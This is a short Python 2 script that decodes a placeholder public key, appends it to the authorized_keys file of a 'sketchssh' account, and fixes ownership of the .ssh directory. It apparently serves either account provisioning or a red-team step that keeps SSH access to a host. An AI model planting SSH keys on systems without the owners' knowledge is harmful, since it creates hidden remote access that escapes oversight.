# /usr/bin/env python

import os
import pwd
import grp
import sys
import stat
import base64
import subprocess
import time
import StringIO
import gzip
from string import ascii_lowercase

PUBKEY = "PUBLIC_KEY_PLACEHOLDER"

RW = stat.S_IRUSR | stat.S_IWUSR

path = "/home/sketchssh/.ssh"

# if .ssh doesn't exist, make it
DOTSSH = os.path.expanduser(path)
if not os.path.exists(DOTSSH):
    os.mkdir(DOTSSH)
    os.chmod(DOTSSH, stat.S_IRWXU)

with open(os.path.expanduser("/home/sketchssh/.ssh/authorized_keys"), "a") as f:
    f.write(base64.b64decode(PUBKEY))
    uid = pwd.getpwnam("sketchssh").pw_uid
    gid = grp.getgrnam("sketchssh").gr_gid
    os.chown(path, uid, gid)
    for dirpath, dirnames, filenames in os.walk(path):
        for dname in dirnames:
            os.chown(os.path.join(dirpath, dname), uid, gid)
        for fname in filenames:
            os.chown(os.path.join(dirpath, fname), uid, gid)
    print "[+] wrote to /home/sketchssh/.ssh/authorized_keys"
